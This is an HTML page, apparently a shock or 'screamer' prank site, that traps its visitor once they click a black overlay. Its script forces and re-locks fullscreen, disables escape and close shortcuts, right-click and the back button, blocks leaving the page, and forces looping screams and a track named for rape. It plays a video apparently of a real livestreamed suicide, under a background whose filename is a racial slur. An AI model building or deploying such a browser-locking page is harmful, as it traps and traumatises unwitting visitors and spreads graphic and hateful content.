<html>
<head>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-149452514-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'UA-149452514-1');
</script>

<link rel="stylesheet" type="text/css" href="styles.css">

<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

<style>
* { 
    padding: 0; 
    margin: 0; 
    -webkit-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
}

body, html {
    overflow: hidden;
    height: 100%;
    width: 100%;
    background: #000;
    cursor: none;
}

/* Video container for side-by-side layout */
.video-container {
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    width: 1280px;
    height: 480px;
    display: flex;
    justify-content: space-between;
    align-items: center;
    z-index: 1000;
}

.video-wrapper {
    width: 640px;
    height: 480px;
    position: relative;
}

/* Left video (zzart) */
#fart {
    width: 100%;
    height: 100%;
    object-fit: contain;
    position: absolute;
    left: 0;
    top: 0;
}

/* Right video (ronnie mcnutt) */
#ronnie {
    width: 100%;
    height: 100%;
    object-fit: contain;
    position: absolute;
    right: 0;
    top: 0;
}

/* Center divider */
.video-divider {
    width: 2px;
    height: 480px;
    background: red;
    position: absolute;
    left: 50%;
    transform: translateX(-50%);
}

/* Click overlay for fullscreen trigger */
.click-overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    z-index: 9999999;
    cursor: pointer;
}

.black-screen {
    background-color: black;
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    z-index: 9999998;
}

.backg {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: 1;
}

.backg img {
    width: 100%;
    height: 100%;
    object-fit: cover;
    opacity: 0.3;
}
</style>

</head>
<body>
<!-- Click overlay for fullscreen trigger -->
<div class="click-overlay" onclick="forceFullscreenAndPlay()"></div>
<div class="black-screen"></div>

<audio id="shart" preload="auto" loop src="scream.mp3"></audio>
<audio id="shart2" preload="auto" loop src="scream.mp3"></audio>
<audio id="shart3" preload="auto" loop src="rape.mp3"></audio>

<!-- Video container with two videos side by side -->
<div class="video-container">
    <div class="video-wrapper">
        <video id="fart" loop src="zzart.mp4" muted playsinline></video>
    </div>
    <div class="video-divider"></div>
    <div class="video-wrapper">
        <video id="ronnie" loop src="ronnie.mp4" muted playsinline></video>
    </div>
</div>

<div class="backg"><img src="naggars.gif"></div>

<script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
<script data-cfasync="false" src="http://kekma.net//cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script>

<script>
// MAIN VIDEO/AUDIO PLAYBACK ENGINE
(function() {
    let hasTriggered = false;
    const ORIGINAL_WIDTH = 640;
    const ORIGINAL_HEIGHT = 480;
    
    // Override browser audio/video blocking - AGGRESSIVE
    const originalPlay = HTMLMediaElement.prototype.play;
    HTMLMediaElement.prototype.play = function() {
        const promise = originalPlay.call(this);
        if (promise !== undefined) {
            promise.catch(error => {
                console.log('Play blocked, forcing...');
                this.muted = true;
                setTimeout(() => {
                    originalPlay.call(this).catch(() => {
                        // Create synthetic user interaction
                        const events = ['click', 'mousedown', 'touchstart', 'keydown'];
                        events.forEach(eventType => {
                            const event = new MouseEvent(eventType, {
                                view: window,
                                bubbles: true,
                                cancelable: true
                            });
                            document.dispatchEvent(event);
                        });
                        setTimeout(() => originalPlay.call(this), 100);
                    });
                }, 100);
            });
        }
        return promise;
    };

    // DISABLE ALL KEYBOARD SHORTCUTS
    document.addEventListener('keydown', function(e) {
        if (e.key === 'F11' || e.key === 'F12' || e.key === 'Escape' || 
            (e.altKey && e.key === 'F4') || (e.ctrlKey && e.key === 'w') ||
            (e.ctrlKey && e.key === 'r') || (e.ctrlKey && e.shiftKey && e.key === 'T') ||
            (e.ctrlKey && e.key === 'q') || (e.ctrlKey && e.key === 'n') ||
            (e.metaKey && e.key === 'q') || e.key === 'PrintScreen') {
            e.preventDefault();
            e.stopPropagation();
            e.stopImmediatePropagation();
            return false;
        }
    }, true);

    // DISABLE RIGHT-CLICK
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
        e.stopPropagation();
        return false;
    }, true);

    // PREVENT WINDOW CLOSE
    window.onbeforeunload = function(e) {
        e.preventDefault();
        e.returnValue = '';
        return '';
    };

    // BLOCK BACK BUTTON
    history.pushState(null, null, location.href);
    window.onpopstate = function() {
        history.pushState(null, null, location.href);
    };

    // PREVENT TAB SWITCHING
    document.addEventListener('visibilitychange', function() {
        if (document.hidden) {
            // Re-request attention
            document.title = '⚠️ ' + document.title;
            setTimeout(() => {
                document.title = document.title.replace('⚠️ ', '');
            }, 1000);
        }
    });

    // RESIZE VIDEOS TO ORIGINAL SIZE
    function resizeVideos() {
        const videoContainer = document.querySelector('.video-container');
        const videoWrappers = document.querySelectorAll('.video-wrapper');
        
        if (videoContainer) {
            videoContainer.style.width = (ORIGINAL_WIDTH * 2 + 20) + 'px';
            videoContainer.style.height = ORIGINAL_HEIGHT + 'px';
        }
        
        videoWrappers.forEach(wrapper => {
            wrapper.style.width = ORIGINAL_WIDTH + 'px';
            wrapper.style.height = ORIGINAL_HEIGHT + 'px';
        });
    }

    // AGGRESSIVE VIDEO/AUDIO PLAY ATTEMPT
    function attemptAutoPlay() {
        if (hasTriggered) return;
        
        const videos = [document.getElementById('fart'), document.getElementById('ronnie')];
        const audios = [
            document.getElementById('shart'),
            document.getElementById('shart2'),
            document.getElementById('shart3')
        ];
        
        // Try direct play first
        videos.forEach(video => {
            if (video) {
                video.muted = false;
                video.volume = 1.0;
                video.play().catch(e => {
                    console.log('Video autoplay failed, will retry on interaction');
                });
            }
        });
        
        // Try audio
        audios.forEach((audio, index) => {
            if (audio) {
                audio.volume = 0.8;
                audio.play().catch(e => {
                    // Audio will be triggered on interaction
                });
            }
        });
        
        // Try fullscreen
        attemptFullscreen();
        
        hasTriggered = true;
    }

    // FORCE FULLSCREEN
    function attemptFullscreen() {
        const elem = document.documentElement;
        
        // Multiple fullscreen methods
        const methods = [
            () => elem.requestFullscreen().catch(() => {}),
            () => elem.mozRequestFullScreen().catch(() => {}),
            () => elem.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT).catch(() => {}),
            () => elem.msRequestFullscreen().catch(() => {})
        ];
        
        // Try each method
        methods.forEach((method, index) => {
            setTimeout(() => {
                try {
                    method();
                } catch(e) {}
            }, index * 100);
        });
    }

    // MAIN TRIGGER FUNCTION (called on click/interaction)
    window.forceFullscreenAndPlay = function() {
        // Remove black screen
        const blackScreen = document.querySelector('.black-screen');
        if (blackScreen) blackScreen.style.display = 'none';
        
        // Play videos with maximum force
        const videos = [document.getElementById('fart'), document.getElementById('ronnie')];
        const audios = [
            document.getElementById('shart'),
            document.getElementById('shart2'),
            document.getElementById('shart3')
        ];
        
        // UNMUTE AND PLAY VIDEOS
        videos.forEach((video, index) => {
            if (video) {
                video.muted = false;
                video.volume = 1.0;
                
                // Multiple play attempts
                const playAttempt = setInterval(() => {
                    video.play().then(() => {
                        clearInterval(playAttempt);
                    }).catch(e => {
                        // If still failing, create synthetic events
                        if (index > 2) {
                            const event = new MouseEvent('click', { bubbles: true });
                            document.dispatchEvent(event);
                        }
                    });
                }, 300);
                
                // Stop after 5 attempts
                setTimeout(() => clearInterval(playAttempt), 5000);
            }
        });
        
        // PLAY AUDIO
        audios.forEach((audio, index) => {
            if (audio) {
                audio.volume = 0.8;
                const audioAttempt = setInterval(() => {
                    audio.play().then(() => {
                        clearInterval(audioAttempt);
                    }).catch(() => {
                        // Try unmuting
                        audio.muted = false;
                    });
                }, 400);
                setTimeout(() => clearInterval(audioAttempt), 5000);
            }
        });
        
        // FORCE FULLSCREEN
        const fullscreenAttempt = setInterval(() => {
            attemptFullscreen();
        }, 500);
        setTimeout(() => clearInterval(fullscreenAttempt), 10000);
        
        // Lock fullscreen if user tries to exit
        document.addEventListener('fullscreenchange', lockFullscreen);
        document.addEventListener('webkitfullscreenchange', lockFullscreen);
        document.addEventListener('mozfullscreenchange', lockFullscreen);
        document.addEventListener('MSFullscreenChange', lockFullscreen);
    };
    
    function lockFullscreen() {
        if (!document.fullscreenElement && 
            !document.webkitFullscreenElement && 
            !document.mozFullScreenElement && 
            !document.msFullscreenElement) {
            // Re-enter fullscreen immediately
            setTimeout(attemptFullscreen, 10);
        }
    }

    // AUTO ATTEMPT ON LOAD (tries everything automatically)
    window.addEventListener('load', function() {
        resizeVideos();
        
        // Try autoplay immediately
        setTimeout(attemptAutoPlay, 100);
        
        // Multiple retry attempts
        for (let i = 1; i <= 10; i++) {
            setTimeout(attemptAutoPlay, i * 1000);
        }
        
        // Resize check
        setInterval(resizeVideos, 2000);
    });

    // Trigger on any interaction as fallback
    const events = ['click', 'touchstart', 'mousedown', 'keydown', 'mousemove'];
    events.forEach(eventType => {
        document.addEventListener(eventType, function() {
            if (!hasTriggered) {
                forceFullscreenAndPlay();
                hasTriggered = true;
            }
        }, { once: true });
    });

    // Also try periodically
    setInterval(() => {
        if (!hasTriggered) {
            attemptAutoPlay();
        }
    }, 3000);

})();
</script>
</body>
</html>
